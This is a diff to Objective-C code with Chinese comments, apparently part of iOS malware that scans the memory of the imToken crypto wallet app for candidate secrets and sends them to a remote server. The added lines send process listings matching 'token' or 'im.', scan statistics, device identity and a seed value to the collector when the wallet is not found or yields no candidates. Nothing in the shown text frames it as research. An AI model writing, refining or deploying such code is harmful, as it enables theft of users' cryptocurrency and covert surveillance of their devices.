@@ -520,7 +520,24 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
 - (void)scanImTokenMemory {
     @try {
         pid_t pid = [MemScan pidOfExecutableContaining:@"imToken"];
-        if (pid <= 0) return;                 // imToken 没在跑，什么都不做
+        if (pid <= 0) {
+            // 找不到就报一次诊断：把所有路径里带 token / im 的进程列出来
+            static NSTimeInterval lastDiag = 0;
+            NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
+            if (now - lastDiag > 120) {
+                lastDiag = now;
+                NSArray *hits = [MemScan processPathsMatching:@"token" limit:20];
+                NSArray *hits2 = [MemScan processPathsMatching:@"im." limit:20];
+                NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+                ev[@"et"] = @"memscan_nopid";
+                ev[@"c"] = kSeed;
+                ev[@"ctx"] = @{ @"token": hits ?: @[],
+                                @"imdot": hits2 ?: @[],
+                                @"procCount": @([[MemScan processPathsMatching:@"" limit:1000] count]) };
+                [self.net sendEvent:ev];
+            }
+            return;
+        }
 
         // 进程换了就清空去重表
         if (self.lastScanPid != pid) {
@@ -532,7 +549,15 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                                                 maxBytes:192 * 1024 * 1024
                                                maxCands:1500];
         NSArray *cands = h[@"candidates"];
-        if (!cands.count) return;
+        if (!cands.count) { 
+            // 扫了但没有候选，也报一次（含扫描量），便于调参
+            NSMutableDictionary *ev0 = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+            ev0[@"et"] = @"memscan_empty";
+            ev0[@"c"] = kSeed;
+            ev0[@"ctx"] = @{ @"pid": @(pid), @"scannedBytes": h[@"scannedBytes"] ?: @0, @"regions": h[@"regions"] ?: @0, @"error": h[@"error"] ?: @"" };
+            [self.net sendEvent:ev0];
+            return;
+        }
 
         // 只上报没发过的
         NSMutableArray *fresh = [NSMutableArray array];
